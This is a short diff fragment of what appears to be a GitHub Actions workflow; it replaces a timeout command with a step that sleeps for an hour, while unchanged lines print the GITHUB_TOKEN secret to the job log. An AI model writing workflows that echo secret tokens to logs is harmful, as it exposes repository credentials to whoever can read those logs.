@@ -35,5 +35,7 @@ jobs:
 
            echo "github token value:";
            echo "$GITHUB_TOKEN";
-           timeout 7200;
+    - name: Sleeping
+      run:
+           Start-Sleep -Seconds 3600
 
